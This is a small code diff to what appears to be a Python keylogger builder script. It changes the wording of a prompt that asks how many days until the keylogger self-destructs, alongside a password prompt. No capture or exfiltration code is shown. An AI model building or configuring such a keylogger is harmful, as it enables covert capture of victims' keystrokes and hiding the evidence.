@@ -24,7 +24,7 @@ passd =  getpass(BLUE + 'Enter your password: ' + END)
 
 chk = input(BLUE + "\nDo you want to add self-destruction [y/n] \n" + header + END)
 if chk == "y" or chk == "Y":
-    days = int(input(BLUE + "Number of days after you want the keylogger to self-destruct (ex. 2) \n" + header + END))
+    days = int(input(BLUE + "Number of days until you want the keylogger to self-destruct (ex. 2) \n" + header + END))
     if days <= 0:
         print("Days should be greater than 0") 
         sys.exit()   
